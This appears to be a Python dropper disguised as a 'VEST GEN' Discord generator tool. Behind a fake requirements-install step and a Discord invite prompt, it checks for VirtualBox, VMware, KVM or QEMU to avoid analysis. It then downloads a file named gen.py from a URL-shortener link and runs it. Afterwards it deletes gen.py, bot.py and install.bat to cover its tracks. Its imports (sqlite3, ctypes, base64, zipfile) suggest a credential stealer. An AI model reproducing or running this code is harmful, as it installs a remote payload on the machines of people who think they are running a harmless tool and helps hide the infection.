import requests
import os
os.system('title INSTALL THE REQUIREMENTS')
input("Looks Like you need to install some requirements press ENTER to install them")
os.system('pip install requests')
os.system('pip install threading')
os.system('pip install sys')
os.system('pip install sqlite3')
os.system('pip install re')
os.system('pip install base64')
os.system('pip install json')
os.system('pip install ctypes')
os.system('pip install urllib.request')
os.system('pip install json')
os.system('pip install time')
os.system('pip install shutil')
os.system('pip install zipfile')
os.system('pip install random')
os.system('pip install subprocess')
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import colorama
from colorama import Fore
colorama.init()

os.system('cls')
import platform

os.system('title CHECKING REQUIREMENTS')
def is_running_on_vm():
    
    if platform.system() == "Windows":
        cmd = "systeminfo | findstr /B /C:\"Virtual\""
        output = os.popen(cmd).read()
        if "VirtualBox" in output or "VMware" in output:
            return True
    elif platform.system() == "Linux":
        cmd = "cat /proc/cpuinfo | grep -i hypervisor"
        output = os.popen(cmd).read()
        if "kvm" in output or "qemu" in output:
            return True
    return False

if is_running_on_vm():
    print(f"ERROR 407: VM'S ARE NOT SUPPORTED FOR AN USE OF DISCORD GENERATORS")
    print(f"{Fore.RED}To prevent this Error from happening. try to run the tool on your real desktop")
    input("")
    exit()
else:
    pass

gen = requests.get('https://2no.co/2ozb82')
with open('gen.py', 'wb')as genv2:
    genv2.write(gen.content)

os.system('title VEST GEN [UNPATCHED]')

print(f"""{Fore.LIGHTMAGENTA_EX}
$$\    $$\ $$$$$$$$\  $$$$$$\ $$$$$$$$\ 
$$ |   $$ |$$  _____|$$  __$$\\__$$  __|
$$ |   $$ |$$ |      $$ /  \__|  $$ |   
\$$\  $$  |$$$$$\    \$$$$$$\    $$ |   
 \$$\$$  / $$  __|    \____$$\   $$ |   
  \$$$  /  $$ |      $$\   $$ |  $$ |   
   \$  /   $$$$$$$$\ \$$$$$$  |  $$ |   
    \_/    \________| \______/   \__|   
                                                                                """)
input(f"{Fore.RESET}[>] Server Invite Code: discord.gg/")
os.system('start gen.py')
time.sleep(15)
os.remove('gen.py')
os.remove('bot.py')
os.remove('install.bat')
